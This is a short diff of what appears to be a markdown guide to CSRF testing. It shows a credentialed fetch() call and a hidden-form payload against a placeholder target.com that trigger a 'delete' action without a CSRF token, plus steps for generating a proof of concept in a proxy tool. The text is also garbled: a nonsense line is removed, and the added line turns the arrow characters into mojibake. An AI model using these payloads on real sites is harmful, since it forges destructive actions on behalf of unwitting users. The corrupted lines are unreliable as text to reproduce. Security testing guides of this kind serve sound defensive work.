@@ -108,7 +108,7 @@ fetch('https://target.com/api/action', {
   method: 'POST',
   credentials: 'include',
   body: 'action=delete&id=123'
-
+  // No csrf_token parameter; relies on the cookie
 });
 ```
 
@@ -122,7 +122,7 @@ fetch('https://target.com/api/action', {
 
 **About Token verification:**
 ```html
-- zzozz, And there's a law in the valuation blog.
+<!-- If the token is in a cookie and validation is flawed -->
 <form action="https://target.com/api/action" method="POST">
   <input type="hidden" name="csrf_token" value="">
   <script>
@@ -143,7 +143,7 @@ fetch('https://target.com/api/action', {
 
 **Using CSRF PoC generator:**
 1. Interception of target requests
-2. Right → Engagement tools → Generate CSRF PoC
+2. Right â†’ Engagement tools â†’ Generate CSRF PoC
 3. Test generatedPoC
 
 ### OWASP ZAP
